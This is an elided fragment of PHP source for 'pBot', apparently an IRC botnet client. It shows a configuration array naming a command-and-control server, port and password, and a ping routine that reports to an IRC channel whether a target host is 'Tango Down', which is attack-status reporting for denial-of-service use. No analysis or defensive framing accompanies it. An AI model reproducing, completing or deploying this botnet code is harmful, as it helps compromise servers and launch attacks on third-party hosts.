<?php
    ...
    */
    ...
    class pBot
    {
    var $config = array("server"=>"visa666.suka.se",
    "port"=>"443",
    "pass"=>"weed",
    "prefix"=>"dank",
    "maxrand"=>"8",
    ...
    function ping($host,$port=80,$timeout=20)
    {
        $fsock = fsockopen($host, $port, $errno, $errstr, $timeout);
        if ( ! $fsock )
        {
    $this->privmsg($this->config['chan'],"[\2Tango Down!\2]");
        }
        else
        {
    $this->privmsg($this->config['chan'],"[\2Not Tango Down....\2]");
        }
    }
